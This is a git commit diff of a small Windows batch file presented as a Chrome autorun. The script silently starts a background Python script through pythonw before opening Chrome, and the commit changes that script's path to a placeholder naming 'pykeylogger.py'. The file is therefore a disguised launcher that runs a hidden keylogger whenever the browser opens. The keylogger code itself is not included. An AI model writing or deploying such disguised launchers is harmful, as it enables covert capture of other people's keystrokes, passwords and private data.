66ea83412ddc9179b09aa37e358f16086a55f567
Chris Gaines <cagaines87@gmail.com>
2018-01-03 02:50:48 -0500

    Update GainesAutoRunChrome.bat

--- GainesAutoRunChrome.bat
+++ GainesAutoRunChrome.bat
@@ -1,3 +1,3 @@
 @echo off
-tasklist /nh /fi "imagename eq pythonw.exe" | find /i "pythonw.exe" > nul || (start "" "C:\Users\cgain\Documents\GainesPythonScript.pyw")
+tasklist /nh /fi "imagename eq pythonw.exe" | find /i "pythonw.exe" > nul || (start "" "[you python script file path ie C:\users\username\pykeylogger.py]")
 start "" "C:\Program Files (x86)\Google\Chrome\Application\Chrome.exe"
